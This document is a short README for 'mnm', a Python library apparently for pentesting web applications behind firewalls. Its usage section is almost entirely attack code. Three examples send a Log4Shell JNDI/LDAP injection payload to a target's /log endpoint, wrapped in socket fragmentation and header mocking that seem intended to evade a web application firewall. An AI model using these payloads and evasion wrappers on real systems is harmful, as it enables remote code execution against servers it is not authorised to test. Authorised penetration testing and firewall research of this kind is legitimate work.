# mnm

This is a simple python library for pentesting firewall protected webapp.

## Installation

```bash
pip install mnm
```

## Usage

```python
from mnm import *
import requests

@mixed(SocketFragmentation(slice=5), HeaderMocking())
def mixed_options(ip):
    r = requests.get(f'http://{ip}/log', data={
        "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
    })
    print(r.text)

@mixed()
def mixed_simple(ip):
    r = requests.get(f'http://{ip}/log', data={
        "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
    })
    print(r.text)

def with_pattern(ip):
    with SocketFragmentation(slice=5), HeaderMocking():
        r = requests.get(f'http://{ip}/log', data={
            "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
        })
        print(r.text)
```

## License

MIT License
